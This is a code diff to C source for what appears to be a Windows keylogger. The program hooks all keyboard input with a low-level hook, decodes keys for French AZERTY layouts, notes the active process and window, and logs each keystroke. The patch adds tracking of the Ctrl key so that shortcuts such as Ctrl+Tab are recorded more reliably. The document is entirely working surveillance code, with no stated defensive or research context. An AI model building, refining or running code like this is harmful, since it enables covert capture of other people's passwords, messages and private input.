@@ -2,6 +2,7 @@
 
 HWND lastWindow = NULL;
 static int suppress_ctrl_up = 0;
+static int ctrl_is_down = 0;
 
 char *get_clean_process_name(const char* full_path) {
     const char* last_backslash = strrchr(full_path, '\\');
@@ -74,6 +75,11 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
         DWORD vkCode = pKeyboard->vkCode;
 
+        if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
+            ctrl_is_down = 1;
+            return CallNextHookEx(NULL, nCode, wParam, lParam);
+        }
+
         // gestion de la locale et état des touches (AZERTY, majuscules...)
         BYTE keyboardState[256] = {0};
         if (!GetKeyboardState(keyboardState)) {
@@ -93,7 +99,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         WCHAR unicodeBuffer[8] = {0};
         int result = ToUnicodeEx(vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 7, 0, keyboardLayout);
 
-        int ctrlDown = (GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 1 : 0;
+        int ctrlDown = ctrl_is_down || ((GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 1 : 0);
         if (ctrlDown) {
             // touches spéciales avec Ctrl : les traiter d'abord pour éviter le fallback générique
             if (vkCode == VK_TAB) { suppress_ctrl_up = 1; LogKey(" [CTRL+TAB] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
@@ -150,6 +156,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
         DWORD vkCode = pKeyboard->vkCode;
         if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
+            ctrl_is_down = 0;
             if (suppress_ctrl_up) {
                 suppress_ctrl_up = 0;
             } else {
